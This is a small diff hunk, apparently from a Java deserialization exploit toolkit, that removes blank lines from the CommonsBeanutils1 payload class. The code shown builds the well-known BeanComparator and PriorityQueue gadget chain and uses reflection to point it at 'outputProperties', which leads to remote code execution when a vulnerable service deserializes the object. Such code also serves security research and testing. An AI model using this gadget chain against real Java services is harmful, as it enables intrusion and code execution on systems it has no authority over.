@@ -14,17 +14,11 @@ public class CommonsBeanutils1 implements ObjectPayload {
     @Override
     public Object getObject(Object templates) throws Exception {
 
-
-
-
         BeanComparator beanComparator = new BeanComparator("lowestSetBit");
-
-
         PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)beanComparator);
 
         queue.add(new BigInteger("1"));
         queue.add(new BigInteger("1"));
-
 
         Reflections.setFieldValue(beanComparator, "property", "outputProperties");
 
